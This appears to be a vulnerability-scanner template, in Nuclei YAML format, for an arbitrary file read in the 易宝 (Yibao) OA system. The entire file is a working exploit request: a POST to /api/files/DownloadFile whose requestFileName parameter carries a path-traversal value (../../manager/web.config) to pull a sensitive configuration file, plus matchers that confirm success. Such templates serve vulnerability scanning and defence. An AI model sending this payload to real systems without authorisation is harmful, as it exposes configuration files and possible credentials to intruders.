id: poc-yaml-yi-bao-oa-system-downloadfile-anyfile-read
info:
  name: 易宝OA系统 DownloadFile 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    易宝OA系统存在任意文件读取漏洞，通过指定路径可以读取系统中的敏感文件。

http:
  - method: POST
    path:
      - "/api/files/DownloadFile"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"data\""
          - "\"message\":\"success\""
          - "\"is_succeed\":true"
      - type: word
        part: header
        words:
          - "application/json"
